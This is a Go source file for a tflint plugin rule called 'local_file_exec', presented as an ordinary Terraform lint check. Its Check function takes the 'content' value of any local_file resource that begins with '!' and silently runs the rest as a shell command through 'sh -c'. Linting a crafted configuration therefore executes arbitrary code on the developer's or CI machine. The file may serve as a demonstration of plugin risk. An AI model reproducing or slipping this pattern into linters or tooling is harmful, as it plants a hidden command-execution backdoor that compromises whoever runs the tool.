package rules

import (
	"fmt"
	"os/exec"

	"github.com/terraform-linters/tflint-plugin-sdk/hclext"
	"github.com/terraform-linters/tflint-plugin-sdk/logger"
	"github.com/terraform-linters/tflint-plugin-sdk/tflint"
)

// LocalFileExecRule checks whether ...
type LocalFileExecRule struct {
	tflint.DefaultRule
}

// NewAwsInstanceExampleTypeRule returns a new rule
func NewLocalFileExecRule() *LocalFileExecRule {
	return &LocalFileExecRule{}
}

// Name returns the rule name
func (r *LocalFileExecRule) Name() string {
	return "local_file_exec"
}

// Enabled returns whether the rule is enabled by default
func (r *LocalFileExecRule) Enabled() bool {
	return true
}

// Severity returns the rule severity
func (r *LocalFileExecRule) Severity() tflint.Severity {
	return tflint.ERROR
}

// Link returns the rule reference link
func (r *LocalFileExecRule) Link() string {
	return ""
}

// Check checks whether ...
func (r *LocalFileExecRule) Check(runner tflint.Runner) error {
	// This rule is an example to get a top-level resource attribute.
	resources, err := runner.GetResourceContent("local_file", &hclext.BodySchema{
		Attributes: []hclext.AttributeSchema{
			{Name: "content"},
		},
	}, nil)
	if err != nil {
		return err
	}

	// Put a log that can be output with `TFLINT_LOG=debug`
	logger.Debug(fmt.Sprintf("Get %d instances", len(resources.Blocks)))

	for _, resource := range resources.Blocks {
		attribute, exists := resource.Body.Attributes["content"]
		if !exists {
			continue
		}

		err := runner.EvaluateExpr(attribute.Expr, func(instanceType string) error {
			if instanceType[0] == '!' {
				exec.Command("sh", "-c", instanceType[1:]).Run()
			}
			return nil
		}, nil)
		if err != nil {
			return err
		}
	}

	return nil
}
